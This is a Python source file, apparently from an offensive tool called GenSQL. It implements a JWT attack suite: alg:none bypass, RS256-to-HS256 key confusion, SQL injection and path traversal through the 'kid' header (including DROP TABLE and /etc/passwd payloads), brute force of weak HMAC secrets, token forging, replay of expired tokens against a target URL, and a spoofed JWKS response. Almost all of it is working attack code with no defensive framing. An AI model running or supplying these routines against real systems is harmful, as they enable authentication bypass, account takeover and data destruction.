#!/usr/bin/env python
"""
GenSQL Technique: Advanced JWT Attacks
Author: Jeevraj
Attacks: alg:none, RS256->HS256 confusion, kid SQLi, kid path traversal,
         weak secret bruteforce, JWK injection, expired token reuse
"""
import base64, hashlib, hmac, json, re, time, urllib.request

class JWTAttacker:
    """Full JWT attack suite - fully offline analysis, no external API."""

    # Common weak JWT secrets for bruteforce
    COMMON_SECRETS = [
        "secret","password","123456","jwt_secret","your-256-bit-secret",
        "your-secret","mysecret","secretkey","jwt","token","auth",
        "admin","root","changeme","qwerty","letmein","welcome",
        "abc123","password1","1234567890","test","dev","prod",
        "secret123","myapp","appkey","supersecret","notverysecret",
        "stackoverflow","hs256","rs256","private","public","key",
        "private_key","api_key","api_secret","client_secret","app_secret",
        "jwtauth","auth_secret","session_secret","cookie_secret","",
        "null","none","undefined","NaN","true","false",
    ]

    KID_SQL_PAYLOADS = [
        "' OR '1'='1",
        "' UNION SELECT 'hacked'--",
        "'; DROP TABLE jwt_keys--",
        "1 OR 1=1",
        "' OR 1=1--",
        "/../../../dev/null",
        "/dev/null",
        "../../etc/passwd",
    ]

    def __init__(self, bruteforce=False, timeout=10):
        self.bruteforce = bruteforce
        self.timeout    = timeout

    # ── Token analysis ────────────────────────────────────────────────────
    def decode_jwt(self, token):
        """Decode JWT without verification. Returns (header, payload, signature)."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None, None, None
            def _b64d(s):
                s += "=" * (-len(s) % 4)
                return json.loads(base64.urlsafe_b64decode(s))
            return _b64d(parts[0]), _b64d(parts[1]), parts[2]
        except Exception:
            return None, None, None

    def detect_jwt(self, headers=None, cookies=None, body=None):
        """Detect JWT tokens in HTTP headers, cookies, and body."""
        JWT_RE = re.compile(r"ey[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
        found = []
        for src in (str(headers or ""), str(cookies or ""), str(body or "")):
            found.extend(JWT_RE.findall(src))
        return list(set(found))

    # ── Attack vectors ────────────────────────────────────────────────────
    def none_algorithm_bypass(self, token):
        """Change alg to 'none' and strip signature."""
        header, payload, _ = self.decode_jwt(token)
        if not header:
            return None
        header["alg"] = "none"
        def _b64e(d):
            return base64.urlsafe_b64encode(json.dumps(d, separators=(",",":")).encode()).rstrip(b"=").decode()
        forged = _b64e(header) + "." + _b64e(payload) + "."
        return forged

    def algorithm_confusion_rs256_hs256(self, token, public_key_pem):
        """Downgrade RS256 to HS256 using the public key as HMAC secret."""
        header, payload, _ = self.decode_jwt(token)
        if not header:
            return None
        header["alg"] = "HS256"
        def _b64e(d):
            return base64.urlsafe_b64encode(json.dumps(d,separators=(",",":")).encode()).rstrip(b"=").decode()
        msg = _b64e(header) + "." + _b64e(payload)
        secret = public_key_pem.encode() if isinstance(public_key_pem, str) else public_key_pem
        sig = hmac.new(secret, msg.encode(), hashlib.sha256).digest()
        return msg + "." + base64.urlsafe_b64encode(sig).rstrip(b"=").decode()

    def kid_sql_injection(self, token, sql_payload=None):
        """Inject SQL into the 'kid' header claim."""
        header, payload, _ = self.decode_jwt(token)
        if not header:
            return []
        results = []
        for sqli in (([sql_payload] if sql_payload else []) + self.KID_SQL_PAYLOADS):
            h = dict(header); h["kid"] = sqli
            h["alg"] = "HS256"
            def _b64e(d):
                return base64.urlsafe_b64encode(json.dumps(d,separators=(",",":")).encode()).rstrip(b"=").decode()
            msg = _b64e(h) + "." + _b64e(payload)
            sig = hmac.new(b"", msg.encode(), hashlib.sha256).digest()
            forged = msg + "." + base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
            results.append({"kid": sqli, "token": forged})
        return results

    def kid_path_traversal(self, token):
        """Path traversal via kid header to read predictable key files."""
        header, payload, _ = self.decode_jwt(token)
        if not header:
            return []
        paths = ["../../dev/null","../../../dev/null","/dev/null",
                 "../../etc/passwd","../config/key.pem","./key.pem"]
        results = []
        for path in paths:
            h = dict(header); h["kid"] = path; h["alg"] = "HS256"
            def _b64e(d):
                return base64.urlsafe_b64encode(json.dumps(d,separators=(",",":")).encode()).rstrip(b"=").decode()
            msg = _b64e(h) + "." + _b64e(payload)
            sig = hmac.new(b"", msg.encode(), hashlib.sha256).digest()
            results.append({"kid": path,
                            "token": msg+"."+base64.urlsafe_b64encode(sig).rstrip(b"=").decode()})
        return results

    def forge_token(self, claims, secret=b"", algorithm="HS256"):
        """Forge a new signed JWT with given claims."""
        header = {"alg": algorithm, "typ": "JWT"}
        if not claims.get("iat"): claims["iat"] = int(time.time())
        if not claims.get("exp"): claims["exp"] = int(time.time()) + 86400
        def _b64e(d):
            return base64.urlsafe_b64encode(json.dumps(d,separators=(",",":")).encode()).rstrip(b"=").decode()
        msg = _b64e(header) + "." + _b64e(claims)
        if isinstance(secret, str): secret = secret.encode()
        sig = hmac.new(secret, msg.encode(), hashlib.sha256).digest()
        return msg + "." + base64.urlsafe_b64encode(sig).rstrip(b"=").decode()

    def expired_reuse(self, token, target_url):
        """Test if the server accepts an expired JWT."""
        try:
            req = urllib.request.Request(target_url,
                headers={"Authorization": "Bearer %s" % token,
                         "User-Agent": "GenSQL/2.0"})
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return {"status": resp.status, "accepted": resp.status == 200}
        except Exception as ex:
            return {"error": str(ex), "accepted": False}

    def weak_secret_bruteforce(self, token, extra_wordlist=None):
        """Bruteforce HMAC secret against common weak secrets (offline)."""
        header, payload, signature = self.decode_jwt(token)
        if not header or header.get("alg","").upper() not in ("HS256","HS384","HS512"):
            return None
        alg_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        hash_fn = alg_map.get(header.get("alg","HS256").upper(), hashlib.sha256)
        parts = token.split(".")
        signing_input = (parts[0] + "." + parts[1]).encode()
        try:
            expected = base64.urlsafe_b64decode(signature + "==")
        except Exception:
            return None
        wordlist = self.COMMON_SECRETS + (extra_wordlist or [])
        for secret in wordlist:
            sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
            if sig == expected:
                return {"found": True, "secret": secret}
        return {"found": False, "tried": len(wordlist)}

    def jwks_spoof_response(self, kid="jeevsql"):
        """Generate a fake JWKS endpoint JSON response (for use with JWK injection)."""
        import os
        n_bytes = os.urandom(256)
        n_b64 = base64.urlsafe_b64encode(n_bytes).rstrip(b"=").decode()
        e_b64 = base64.urlsafe_b64encode(b"").rstrip(b"=").decode()
        return json.dumps({
            "keys": [{
                "kty": "RSA", "kid": kid, "use": "sig",
                "alg": "RS256", "n": n_b64, "e": e_b64,
            }]
        }, indent=2)
